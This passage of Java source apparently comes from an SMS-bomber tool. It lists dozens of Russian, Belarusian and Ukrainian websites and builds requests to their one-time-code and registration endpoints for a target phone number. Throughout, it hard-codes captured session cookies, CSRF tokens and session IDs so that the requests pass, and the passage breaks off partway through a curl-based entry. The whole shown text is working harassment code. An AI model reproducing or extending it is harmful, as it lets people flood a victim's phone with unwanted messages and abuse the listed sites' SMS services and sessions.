                        request.header("Cookie", "mobile=0; PHPSESSID=bace5u00ika8uof0l5fnarghqa; force_retail=1; tmr_lvid=410e418fcc154263f49cb33f89a7d116; tmr_lvidTS=1659889538438; _ym_uid=1659889539808263206; _ym_d=1671287138; _ym_visorc=w; _fbp=fb.1.1671287138438.164094442; _ga_Y2EVY0XNQR=GS1.1.1671287138.1.0.1671287138.60.0.0; _gcl_au=1.1.1998363881.1671287139; _ga=GA1.2.1902648730.1671287139; _gid=GA1.2.832627514.1671287139; mla_visitor=cd6d7305-a822-4fb5-b1de-39630f27e8b5; roistat_visit=5161518; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _gat_gtag_UA_58872796_2=1; subscribe=1; CookieNotifyWasShown=true; _tt_enable_cookie=1; _ttp=hH6r6WBtNfvJs0u_rud7w6J66oz; _ym_isad=2; mlaVisitorDataCheck=true; c2d_widget_id={\"29ce0c23c6847da7762665e3334c1d84\":\"[chat] 5b2a7cf5f1f20e9cf984\"}; ___dc=fec6163f-13da-4ae6-8158-9d2438579224; tmr_detect=0|1671287142135; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=[]; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,roistat_call_tracking,roistat_emailtracking_email,roistat_emailtracking_tracking_email,roistat_emailtracking_emails; cart_token=639dd17caf2b87.55241429167838119; ny-steps=nyCategories; activity=8|30");

                        try {
                            return new JSONObject()
                                    .put("action", "generateOtp")
                                    .put("login_contact", "+" + phone)
                                    .put("personal_identificator", "")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://bonus.sila.by/", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("x-requested-with", "XMLHttpRequest");
                        request.header("Cookie", "_gcl_au=1.1.1258362633.1670779318; tmr_lvid=2c2c90b746185d1088071821758e2f47; tmr_lvidTS=1670779318704; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _ym_uid=1670779319225302469; _ym_d=1670779319; _tt_enable_cookie=1; _ttp=122a8487-c5e6-43aa-9c1b-3da364459fc9; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; stock=0; dost=0; pzakaz=0; privl=0; bvznos=0; city=city_all; rsort=0; csort=0; hsort=0; CLIENT_ID=3c380bc73490fc87d22f8f6498d2fdf8; CLIENT_ID_D=2022-12-17; current_sbjs={\"type\":\"typein\",\"source\":\"direct\",\"medium\":\"(none)\",\"campaign\":\"(none)\",\"content\":\"(none)\",\"term\":\"(none)\"}; _gid=GA1.2.1875298458.1671288629; _fbp=fb.1.1671288628957.1297417435; _ym_isad=2; _ym_visorc=b; _ga_RX9C2H96ND=GS1.1.1671288628.2.1.1671288717.52.0.0; _ga_61E2WGG401=GS1.1.1671288628.2.1.1671288717.0.0.0; _ga=GA1.2.1527090176.1670779319; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1671288720680");

                        builder.add("form_phone", Phone.format(phone.getPhone(), "+(375) (**) ***-**-**"));
                        builder.add("form_index", "");
                        builder.add("step", "confirm_ok");
                        builder.add("action", "send_sms");
                        builder.add("key", "");
                    }
                },

                new FormService("https://chitatel.by/send-code", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("X-Requested-With", "XMLHttpRequest");
                        request.header("Cookie", "_ga=GA1.2.290784147.1671288272; _gid=GA1.2.968710235.1671288272; _gat_UA-64066831-1=1; _gat_gtag_UA_64066831_1=1; tmr_lvid=f634f47d2ff0fec7f1c9ab4cf1a4b7fe; tmr_lvidTS=1671288271709; _ym_uid=1671288272615254027; _ym_d=1671288272; _ym_isad=2; _ym_visorc=w; _fbp=fb.1.1671288273233.1930776256; tmr_detect=0|1671288275026; assitcode=787350; st=a:4:{s:5:\"phone\";s:12:\"375253425432\";s:8:\"end_time\";i:1671331488;s:7:\"attempt\";i:1;s:4:\"time\";i:1671288288;}; XSRF-TOKEN=eyJpdiI6ImViVXFKNHdsSTlVNVRqT2FOUEFISnc9PSIsInZhbHVlIjoicmYwRlNaUFlEYUxUWWNaY2VXYmRjcGZrS0tyeDVWZGZIcFQ4cjZBT1pBNmt4a095WEpTXC9IaFM2YmttYzZJc2ZYRmE0Mlwvc1BhMFNKWGFlMVhlY2ZjUT09IiwibWFjIjoiNTgxNDljYmViMDgxYjJkZDNkN2FkZjkzMzNkY2RjYmM3ZjE5NWU1ZWM1YzA0NTU5N2UyNTBhNzIxYjQzYTc3MSJ9; chitatel_session=eyJpdiI6IjlhRUtRWkttVE9od1JodDVBbmMzV1E9PSIsInZhbHVlIjoiN2wrTys3RGhNZ0EzSElaWGZXdURkWnF5b1FQVmxOdmY1NlwvUFh0K29laW4zUU16c0hWV2JTdDlRbnZxXC9EK2FuRncrNGF3aHg5UjRtWTFHTitHZHVVQT09IiwibWFjIjoiNDFmMDRkMDY0MGM2NDRhYzQ3OTViZTA3NzQ0M2U5ODhiODg5NTgwZjYwZTU2YWVlMjQ4NWM1MjZlODE0ZDlhNCJ9");

                        builder.add("tel", Phone.format(phone.getPhone(), "+375(**)*******"));
                        builder.add("_token", "7bExV7WeW0wmdI83WV7Ie15I3u76NWj31g6ZINMJ");
                    }
                },

                new FormService("https://burger-king.by/bitrix/services/main/ajax.php?mode=class&c=gmi:auth&action=auth", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.headers(new Headers.Builder()
                                .addUnsafeNonAscii("Cookie", "PHPSESSID=GdOObYTyZnr3Y6IKTLBAHBiKKPuEiRPQ; MITLAB_LOCATION=Минск; BITRIX_SM_SALE_UID=e9a04576ac4ff47afcca148588730f08; _gcl_au=1.1.517852574.1670158994; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1670187540,\"UNIQUE\":[\"conversion_visit_day\"]}; tmr_lvid=6d30e847bf5b1fa358bc5883aceb291e; tmr_lvidTS=1670158994895; _gid=GA1.2.1799965065.1670158995; _gat_UA-97562271-1=1; _ym_uid=1670158996375763202; _ym_d=1670158996; _ym_visorc=w; _ym_isad=2; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _fbp=fb.1.1670158996398.1982554257; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _tt_enable_cookie=1; _ttp=2cd5d1d3-dff6-4719-b37d-396b7b001d43; tmr_detect=0|1670158997863; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ga=GA1.2.1576225425.1670158995; _ga_S74W5N1C73=GS1.1.1670158996.1.0.1670159005.0.0.0; _ga_M7LVHBCDVN=GS1.1.1670158996.1.0.1670159005.0.0.0")
                                .build());

                        builder.add("fields[action]", "send_code");
                        builder.add("fields[phone]", Phone.format(phone.getPhone(), "+375(**) *******"));
                        builder.add("SITE_ID", "s1");
                        builder.add("sessid", "ed6df32bf2e9efe2deaa84c498c78811");
                    }
                },

                new JsonService("https://api.qugo.ru/client/send-code") {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Origin", "https://qugo.ru");
                        request.header("Referer", "https://qugo.ru/");

                        try {
                            return new JSONObject()
                                    .put("phone", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://webgate.24guru.by/api/v3/auth?lang=ru&cityId=3&jsonld=0&onlyDomain=1&domain=bycard.by&distributor_company_id=296", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+375 ** ***-**-**"));
                        builder.add("country", "BY");
                    }
                },

                new FormService("https://evelux.ru/local/templates/evelux/ajax/confirm.phone.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=hkmv218l5bj0ecie6mi1lrdmgf; CHECK_COOKIE=Y; EVELUX_SM_GUEST_ID=97681; EVELUX_SM_SALE_UID=cbcc80295ff39e55f5e4abfed249f62b; _ga=GA1.1.1818619075.1674662998; ECITY=3667; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1674680340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=167466299925001007; _ym_d=1674662999; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; EVELUX_SM_LAST_VISIT=25.01.2023%2019%3A10%3A22; _ga_JS558ZNNRN=GS1.1.1674662997.1.1.1674663024.0.0.0; activity=0|30");

                        builder.add("PHONE", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                        builder.add("TYPE", "REG");
                        builder.add("CONFIRM_PHONE", "Y");
                    }
                },

                new JsonService("https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "00bcc2c49129af9bd7e2d92cb51ab14c=f60bc04df68b1680331437133025b53f; 33dc6fb66f07bbc13d7e8a3e3a4df978=f60bc04df68b1680331437133025b53f; ce2186f97fc08728512058e32d42e3a8=f60bc04df68b1680331437133025b53f; _ym_uid=1674663457615854858; _ym_d=1674663457; _ym_isad=2; _ym_visorc=w; remove_token=1; tmr_lvid=cd34b6ce59fd14abe64455961bcbd77c; tmr_lvidTS=1674663462883; __exponea_etc__=bf4f369d-5796-4166-9e43-8065875990ea; __exponea_time2__=-0.7267756462097168; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1674663465216");
                        request.header("referer", "https://svoefermerstvo.ru/auth?authFrom=index&backurl=https://svoefermerstvo.ru/&failurl=https://svoefermerstvo.ru/");
                        request.header("origin", "https://svoefermerstvo.ru");

                        try {
                            return new JSONObject()
                                    .put("login", "+" + phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://api3.pomogatel.ru/accounts", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("session-details", "a04df5cb-0ba1-4f7c-8f44-4b7033e74711:9fee9170-37f5-4b42-8858-2763781932a4");
                        request.header("user-language", "ru-RU");
                        request.header("platform", "web");

                        return "{\"address\":\"Москва, 2-я Владимирская\",\"country\":\"Россия\",\"locality\":\"Москва\",\"street\":\"2-я Владимирская улица\",\"latitude\":\"55.751264\",\"longitude\":\"37.784524\",\"roleId\":2,\"phoneNumber\":\"" + phone.getPhone()
                                + "\",\"phoneNumberMasked\":\"" + Phone.format(phone.getPhone(), "+7(***)***-**-**")
                                + "\",\"type\":\"phone\",\"specializationId\":2}";
                    }
                },

                new JsonService("https://lk.mysbertips.ru/sbrftips-proxy/registration/newotp", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61");
                        request.header("Cookie", "SESSION=NDJiYWE0MmUtMWNjMy00YmFmLWIyZWMtMTRkZDNjNGQwMWM3; _ym_uid=1674665215289598227; _ym_d=1674665215; _sa=SA1.2d07e266-09de-4fa9-b232-1d8a9ef458e3.1674665214; adtech_uid=24a2176e-f8b2-4682-812e-326068cb377d:mysbertips.ru; user-id_1.0.5_lr_lruid=pQ8AAP9c0WMDffReAW1bjQA=; _ym_isad=2; _ym_visorc=w");

                        try {
                            return new JSONObject()
                                    .put("login", phone.getPhone())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new ParamsService("https://www.elmarket.by/public/ajax/sms_reg.php", 375) {
                    @Override
                    public void buildParams(Phone phone) {
                        request
                                .header("X-Requested-With", "XMLHttpRequest")
                                .header("Cookie", "PHPSESSID=75ffo2jbrgiilp6ru01ehorsg3; BITRIX_SM_WATCHER_REFERER_ID=11; _fbp=fb.1.1674666273780.2098848882; BITRIX_SM_BUYER_ID=34615018; BITRIX_SM_BUYER_KEY=78ba6e6eb4bb251a38225386e8883b19; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4");

                        builder
                                .addQueryParameter("phone", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"))
                                .addQueryParameter("code", "")
                                .addQueryParameter("UF_REG_AGREE_PERS", "Y");
                    }
                },

                new FormService("https://vladimir.holodilnik.ru/ajax/user/get_tpl.php?96.22364161776159", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request
                                .header("Cookie", "region_position_nn=24; clean=1; new_home=2; oneclick_order=1; new_reg=2; HRUSID=8f3a403f8f1002b7df0cdc1234b5b834; HRUSIDLONG=8a51a897e72d705cfb0f2d4c1a1ebf6a; csrfnews=8ac641e766c183e782f0706756539ab3; mindboxdbg=0; tmr_lvid=668db02d45d79ad233216bc3a7aef88b; tmr_lvidTS=1673961864893; _ga=GA1.2.1588267531.1673961865; _ym_uid=1673961868198063374; _ym_d=1673961868; _userGUID=0:ld09oc00:Kr2KhQWKzm~voxxbrrmT4bSCUcN8nho_; advcake_track_id=5dd8b4db-6078-ae09-d2bf-7659a208454f; advcake_session_id=ccac051d-b53e-53bb-7567-61fae11a8ee8; flocktory-uuid=e429bd85-39fc-4d6b-9b57-d6abe16258af-3; wtb_sid=null; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _gpVisits={\"isFirstVisitDomain\":true,\"todayD\":\"Tue Jan 17 2023\",\"idContainer\":\"1000247C\"}; adrcid=A0WchnQwBnxZ1EMPWxqzT3A; aprt_last_partner=actionpay; aprt_last_apclick=; aprt_last_apsource=1; _ga_EHP29G0JCQ=GS1.1.1673978244.2.0.1673978244.0.0.0; OrderUserType=1; HRUSIDSHORT=01933d4afb396c7405ee9f30809b3582; _utmx=8f3a403f8f1002b7df0cdc1234b5b834; _gid=GA1.2.1622488607.1674747661; dSesn=a33b4119-8977-a5c5-1cc4-72a8c3cdbddf; _dvs=0:ldd9im3g:~~w7twQuttk6ru660celwXTh1ZSeWppu; _ym_isad=2; _ubtcuid=cldd9im7p00003nbnukki9pu6; action_blocks=; banners_rotations=1067; _utmz=2cebd56ce5cbf15d6e6fdaa7d46aa40551ade24425f8530e480df12b1823376e; _sp_ses.4b6a=*; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1674747664191; PHPSESSID=503437c08856d897c7942267cb62eab0; _gat=1; _sp_id.4b6a=3ce0c76f-2b49-434d-9fdf-7a5ce8f9fb30.1673961869.2.1674747882.1673961984.a30f1324-8eca-4544-9a3c-3572d897dccf")
                                .header("X-Requested-With", "XMLHttpRequest");

                        builder
                                .add("ajkey", "cf0ed62da76642fc510e517210addd06")
                                .add("ajform", "LOGIN_FORM")
                                .add("ajaction", "GET_CODE")
                                .add("ajphoneORemail", "+" + phone)
                                .add("ajverifycode", "")
                                .add("ajUserType", "1")
                                .add("ajConfPhone", "")
                                .add("ajConfEmail", "")
                                .add("ajPswd", "")
                                .add("ajSubMode", "");
                    }
                },

                new Service(380) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://online-apteka.com.ua/assets/components/ajaxfrontend/action.php")
                                .headers(new Headers.Builder()
                                        .add("x-requested-with", "XMLHttpRequest")
                                        .addUnsafeNonAscii("Cookie", "PHPSESSID=ovtn4q0g3f4g1c3mdnkuu94gon; msfavorites=ovtn4q0g3f4g1c3mdnkuu94gon; lastContext=web; _gid=GA1.3.2033245176.1674752800; _gat_gtag_UA_88170340_1=1; _ga_3SRTFP3H03=GS1.1.1674752799.1.1.1674752804.0.0.0; _ga=GA1.3.1765539140.1674752800; biatv-cookie={\"firstVisitAt\":1674752799,\"visitsCount\":1,\"campaignCount\":1,\"currentVisitStartedAt\":1674752799,\"currentVisitLandingPage\":\"https://online-apteka.com.ua/\",\"currentVisitOpenPages\":2,\"location\":\"https://online-apteka.com.ua/auth.html\",\"locationTitle\":\"Вход\\\\Регистрация - Мед-Сервис\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61\",\"language\":\"ru\",\"encoding\":\"utf-8\",\"screenResolution\":\"1536x864\",\"currentVisitUpdatedAt\":1674752802,\"utmDataCurrent\":{\"utm_source\":\"(direct)\",\"utm_medium\":\"(none)\",\"utm_campaign\":\"(direct)\",\"utm_content\":\"(not set)\",\"utm_term\":\"(not set)\",\"beginning_at\":1674752799},\"campaignTime\":1674752799,\"utmDataFirst\":{\"utm_source\":\"(direct)\",\"utm_medium\":\"(none)\",\"utm_campaign\":\"(direct)\",\"utm_content\":\"(not set)\",\"utm_term\":\"(not set)\",\"beginning_at\":1674752799},\"geoipData\":{\"country\":\"Poland\",\"region\":\"Mazovia\",\"city\":\"Warsaw\",\"org\":\"\"}}; bingc-activity-data={\"numberOfImpressions\":0,\"activeFormSinceLastDisplayed\":0,\"pageviews\":1,\"callWasMade\":0,\"updatedAt\":1674752810}")
                                        .build())
                                .post(RequestBody.create("------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"login\"\n" +
                                                "\n" +
                                                Phone.format(phone.getPhone(), "+38 (0**) ***-**-**") +
                                                "\n------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"action\"\n" +
                                                "\n" +
                                                "generatePassword\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"hash\"\n" +
                                                "\n" +
                                                "1b0e6c59bf26361ac6b9d382fb515f2b\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"hash_dynamic\"\n" +
                                                "\n" +
                                                "5111af00ece822750e74d295aa17f79f\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"context\"\n" +
                                                "\n" +
                                                "web\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"page_id\"\n" +
                                                "\n" +
                                                "58886\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e\n" +
                                                "Content-Disposition: form-data; name=\"page_url\"\n" +
                                                "\n" +
                                                "/auth.html\n" +
                                                "------WebKitFormBoundaryKJ1G3JA5mtkOMt2e--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryKJ1G3JA5mtkOMt2e")))
                                .build()).enqueue(callback);
                    }
                },

                new JsonService("https://anc.ua/authorization/auth/v2/register", 380) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "auth.strategy=local; auth._token.local=false; auth._refresh_token.local=false; city=5; _gid=GA1.2.2014301269.1674753416; _fbp=fb.1.1674753418996.1198222138; _ga_36VHWFTBMP=GS1.1.1674753419.1.0.1674753419.60.0.0; sc=35564E72-62BB-B2D6-FDA0-BFBA8391ED2D; _ga=GA1.2.117128623.1674753416; _dc_gtm_UA-169190421-1=1");

                        try {
                            return new JSONObject()
                                    .put("login", "+" + phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://rnr.com.ua/sms/send", 380) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone_number", Phone.format(phone.getPhone(), "+38 (0**) *** ** **"));

                        request
                                .header("x-csrf-token", "PeCkfQTNSESvpofMgX2bRlSqk7Ab5rkSZ38dHY1a")
                                .header("x-csrftoken", "PeCkfQTNSESvpofMgX2bRlSqk7Ab5rkSZ38dHY1a")
                                .header("x-requested-with", "XMLHttpRequest");
                    }
                },

                new MultipartService("https://woodman.by/resource/themes/woodman/action/login/verify.php?register=true", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=95a6b858b762b5b1553ddcf65bfaee04; _gcl_au=1.1.734651332.1675604508; _gid=GA1.2.1783988263.1675604508; _gat_gtag_UA_180993361_1=1; _dc_gtm_UA-180993361-1=1; _ym_uid=1675604508910510402; _ym_d=1675604508; _fbp=fb.1.1675604507962.2028429428; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.399891246.1675604508; _ga_HZKXP3YNMT=GS1.1.1675604507.1.1.1675604511.0.0.0; welcome-cookie=true");

                        builder.addFormDataPart("phone", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"));
                        builder.addFormDataPart("country", "by");
                        builder.addFormDataPart("password", "");
                        builder.addFormDataPart("code", "");
                    }
                },

                new JsonService("https://api.sunlight.net/v3/customers/authorization/", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.headers(new Headers.Builder()
                                .add("X-Requested-With", "SunlightFrontendApp")
                                .addUnsafeNonAscii("Cookie", "city_auto_popup_shown=1; region_id=a2abfdde-54eb-43c0-981c-644657238a3c; region_subdomain=\"\"; ccart=off; session_id=1b7ddd46-ee43-443f-9faa-b0274689f4ab; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; _ga=GA1.2.1099609403.1670778978; _gid=GA1.2.1444923732.1670778978; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; _tt_enable_cookie=1; _ttp=a3a48ff1-8e5d-407d-8995-dc4e7ca99913; _ym_uid=1659884110990105023; _ym_d=1670778978; _ym_isad=2; _ym_visorc=b; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _ga_HJNSJ6NG5J=GS1.1.1670778977.1.0.1670778980.57.0.0; auid=1196ce38-5136-4290-bf14-e29d02d50fa7:1p4Pw3:gOobko9I_s6h9Ng8IWQXyNN-TejCW4-SO1-lN7_LLjQ; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}")
                                .build());

                        try {
                            return new JSONObject()
                                    .put("phone", phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://dostavka.dixy.ru/ajax/mp-auth-test.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=5ab480a3917eae435390edb75770783a; price_id=80; BITRIX_SID=6C68VRK27r; BITRIX_SM_SALE_UID=755ab7df02053be0e14760d64d16f5b9; _ym_debug=null; countmobile=2; usecookie=accept; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1676408340,\"UNIQUE\":[\"conversion_visit_day\"]}; _gid=GA1.2.1143019386.1676373558; _dc_gtm_UA-172001173-1=1; _ga=GA1.3.1377249881.1676373558; _gid=GA1.3.1143019386.1676373558; _gat_UA-172001173-1=1; _ym_uid=167637355813882176; _ym_d=1676373558; _ga_J3JT2KMN08=GS1.1.1676373558.1.0.1676373558.60.0.0; _ga=GA1.1.1377249881.1676373558; tmr_lvid=ea5f0ffa7ac4e6584f870de9a81d1313; tmr_lvidTS=1676373558371; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; tmr_detect=0|1676373561282");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("phone", phone.toString());
                        builder.add("licenses_popup", "Y");
                        builder.add("licenses_popup1", "Y");
                        builder.add("licenses_popup2", "Y");
                    }
                },

                new FormService("https://tb.tips4you.ru/auth/ajax/signup_action", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=boe2n8jajco2f38tol7o6htedr; _csrf=56a6833d81db55efdbbd72be737db8d3; _ym_uid=167637442891771139; _ym_d=1676374428; _ym_isad=2; _ym_visorc=w");
                        request.header("X-Requested-With", "XMLHttpRequest");

                        builder.add("phone", Phone.format(phone.getPhone(), "(***) ***-**-**"));
                        builder.add("step", "1");
                    }
                },

                new FormService("https://new.moy.magnit.ru/local/ajax/login/", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+7 ( *** ) ***-**-**"));
                        builder.add("ksid", "225294bc-012e-4054-97c3-c4dbefb8f0af_0");

                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");

                        request.header("Cookie", "PHPSESSID=6e2s2jco3rvpi33tluqecad3kt; _gid=GA1.2.1116348124.1676383880; _gat_UA-61230203-9=1; _gat_UA-61230203-3=1; _ym_uid=1661249544448490865; _ym_d=1676383880; _clck=1j2pzux|1|f94|0; _ym_visorc=w; _ym_isad=2; _ga=GA1.4.490589619.1676383880; _gid=GA1.4.1116348124.1676383880; _gat_UA-61230203-5=1; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; KFP_DID=fe822d3f-4a57-723d-2706-a9521f9bd17d; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1676408340,\"UNIQUE\":[\"conversion_visit_day\"]}; _clsk=vn6qns|1676383884870|2|1|i.clarity.ms/collect; _ga=GA1.2.490589619.1676383880; _ga_GW0P06R9HZ=GS1.1.1676383884.1.0.1676383893.0.0.0; oxxfgh=225294bc-012e-4054-97c3-c4dbefb8f0af#1#7884000000#5000#1800000#12840");
                    }
                },

                new JsonService("https://api.starterapp.ru/clubve/auth/resetCode", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("sessionid", "4041bd83-f1fe-4711-8efa-6ac31e81b3de");
                        try {
                            return new JSONObject()
                                    .put("phone", phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://sushiwok.ru/user/phone/validate", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("x-csrf-token", "KxUtYXrV-FfrHJ6ZLIcCuyZqv7GSWVmfzf8M");
                        request.header("x-requested-with", "XMLHttpRequest");
                        request.header("cookie", "_csrf=p4ZnbhHfcQYr8Qbp0lGWTLlq; connect.sid=s:gqjmNZSZipi0Du2DyS9mWHQvB56fAS04.87oxCkV/g3cERTuw/eR2kzyKkzyH32Il1SnfYdZl6Js; _sticky_param=4; _gid=GA1.2.1525497464.1676386386; _gcl_au=1.1.1311383257.1676386386; tmr_lvid=d0323dada0a19b9780be03fd69d9b9bd; tmr_lvidTS=1651933668037; _gat_gtag_UA_88670217_1=1; _gat_ITRZ=1; _gat_SPB=1; _gat_GA=1; _ym_uid=1651933669991734830; _ym_d=1676386387; _ym_isad=2; parameterURL=https://sushiwok.ru/spb/profile/; lgvid=63eba053d2225a00019e6ffd; lgkey=a9068628303b848d1d311b37fa95b8a3; _ym_visorc=w; _tt_enable_cookie=1; _ttp=ceLZ07HWH_ygNJkoURbiQwbRQxW; tmr_detect=0|1676386389144; _ga_TE53H5X77H=GS1.1.1676386386.1.1.1676386389.0.0.0; _ga=GA1.2.232668185.1676386386; _gat_gtag_UA_88670217_10=1");
                        request.header("referer", "https://sushiwok.ru/spb/profile/");
                        request.header("Sec-Fetch-Dest", "empty");
                        request.header("Sec-Fetch-Mode", "cors");
                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                        request.header("sec-ch-ua-mobile", "?0");
                        request.header("sec-ch-ua-platform", "\"Windows\"");
                        request.header("Sec-Fetch-Site", "same-site");
                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41");
                        request.header("origin", "https://sushiwok.ru");

                        try {
                            return new JSONObject()
                                    .put("phone", Phone.format(phone.getPhone(), "+7(***)***-**-**"))
                                    .put("numbers", "4")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://spb.uteka.ru/rpc/?method=auth.GetCode", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request
                                .header("platform", "Desktop")
                                .header("version", "299a1566")
                                .header("Cookie", "utid=uRELsmP93dxv200sAyHgAg==; _ym_uid=1677581792865430072; _ym_d=1677581792; _ym_isad=2; _gid=GA1.2.1174750557.1677581792; _gat_gtag_UA_117125065_1=1; _ga=GA1.1.567396639.1677581792; _ga_BQFFN693N9=GS1.1.1677581791.1.0.1677581799.0.0.0; _ym_visorc=b");

                        return "{\"jsonrpc\":\"2.0\",\"id\":7,\"method\":\"auth.GetCode\",\"params\":{\"phone\":\"" + phone.getPhone() + "\",\"mustExist\":false,\"sendRealSms\":true}}";
                    }
                },

                new CurlService("curl 'https://lgcity.ru/ajax/Auth/SmsSend/' \\\n" +
                        "  -H 'authority: lgcity.ru' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
